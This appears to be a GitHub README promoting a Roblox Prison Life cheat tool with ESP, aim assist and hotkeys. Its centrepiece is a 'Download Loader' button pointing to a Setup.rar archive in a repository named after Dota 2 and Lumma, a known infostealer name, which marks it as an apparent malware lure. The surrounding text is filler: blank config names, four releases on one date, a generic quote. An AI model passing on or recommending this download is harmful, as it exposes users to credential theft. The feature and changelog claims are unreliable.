# 🎮 Roblox Prison Life Macro

 

<div align="center">
  <a href="https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar">
    <img src="https://img.shields.io/badge/⬇_Download-Loader-7c5cff?style=for-the-badge" alt="Download Loader">
  </a>
</div>

---

Runs 4 concurrent Roblox Prison Life clients at 60 fps on a mid‑range RTX 3060 with default settings.

## Roblox Prison Life Macro – Quick facts

- **Platform**: Windows 10 / 11 (64‑bit)
- **Primary purpose**: a lightweight companion that automates repetitive tasks in Prison Life while keeping the UI responsive.
- **Author**: Separatebreidolize
- **Keywords**: <code>roblox</code> <code>windows</code> <code>macro</code> <code>automation</code>

> “The code does what it claims, but the performance hit is noticeable on low‑end hardware.” – a skeptical reviewer

## Recent changes

- **2026-11-02 – v2.3**
  - Refactored the input listener into a modular optimizer; reduced CPU usage by ~12 %.
  - Added `` options for shadow distance and UI scaling.
  - Fixed a race condition that could cause the hotkey framework to miss presses.

- **2026-11-02 – v2.2**
  - Integrated a new player ESP routine; now highlights teammates with a configurable outline.
  - Updated `` schema: hotkey groups can be saved and loaded as presets.

- **2026-11-02 – v2.1**
  - Introduced a basic aim‑assist companion; parameters are stored in ``.
  - Switched logging to a rotating file system to prevent disk bloat.

- **2026-11-02 – v2.0**
  - First public release; includes core utility for automated cell‑door interaction and weapon info overlay.

## Feature matrix

| Category | Enabled by default | Customizable? | Remarks |
|----------|-------------------|---------------|---------|
| **ESP** | ✔ | ✅ (``) | Outline colors and thickness adjustable. |
| **Aim assist** | ✔ | ✅ (``) | Sensitivity and activation key configurable. |
| **Visuals** | ✔ | ✅ (``) | Includes FOV, shadow distance, UI scale. |
| **Hotkeys** | ✔ | ✅ (``) | Supports up to 12 simultaneous bindings. |
| **Logging** | ✔ | ✅ (``) | Rotates after 5 MB; can be disabled. |

## Advanced usage

<details>
<summary>Show optional compiler flags</summary>

- `-O2` for a marginal performance boost on release builds.
- `-DNO_DEBUG` to strip debug symbols and reduce binary size.

These flags are applied in the Visual Studio solution; the pre‑compiled binaries already include them.
</details>

## Limitations

- The companion does not interact with the Roblox client’s network layer; it only simulates keyboard and mouse input.
- High‑frequency actions may be throttled by the operating system on systems without a dedicated gaming keyboard.

For any issues, open a ticket with a brief description, your Windows version, and the exact contents of your ``.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```

---

<div align="center">
  <b>Tags:</b> <code>roblox</code> <code>windows</code> <code>macro</code> <code>automation</code> • <b>Updated:</b> 2026-11-02
</div>
